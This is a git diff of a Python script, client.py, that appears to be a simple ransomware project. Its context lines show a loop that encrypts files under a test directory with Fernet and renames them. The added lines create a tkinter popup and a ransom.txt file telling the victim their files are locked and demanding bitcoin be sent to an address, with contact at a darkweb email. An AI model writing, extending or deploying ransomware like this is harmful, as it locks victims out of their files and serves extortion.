@@ -3,6 +3,9 @@ from cryptography.fernet import Fernet
 # client.py  
 import socket
 from random import randint
+from tkinter import *
+from tkinter import ttk
+from pathlib import Path
 
 #import pathlib
 #drive = pathlib.Path.home().drive
@@ -73,4 +76,23 @@ for root, dirs, files in os.walk(r"./TestDirectories", topdown=False):
                 newName = curFile.rsplit('.', 1)
                 newName[0] = newName[0] + ".encrypted" + ext
                 os.rename(curFile, newName[0])
-print("You've been pwned. Send 999BTC to 23098c90ds. When done so, contact me@darkweb.com. You will need your id.id file.")
+#print("You've been pwned. Send 999BTC to 23098c90ds. When done so, contact me@darkweb.com. You will need your id.id file.")
+
+win = Tk()
+win.geometry("750x270")
+
+messagestring="You've been pwned.\nYour files have been locked.\n To unlock: \n Send all the BTC to 23098c90ds.\n When done so, contact me@darkweb.com.\n You will need your id.id file."
+def open_popup():
+   top= Toplevel(win)
+   top.geometry("750x250")
+   top.title("Bitcoin address")
+   Label(top, text= messagestring, font=('Helvetica 14 bold')).place(x=150,y=80)
+
+Label(win, text=" You've been HACKED. Press button below to see message.", font=('Helvetica 14 bold')).pack(pady=20)
+#Create a button in the main Window to open the popup
+ttk.Button(win, text= "Open", command= open_popup).pack()
+win.mainloop()
+
+f = open("ransom.txt", "w+")
+f.write(messagestring)
+f.close()
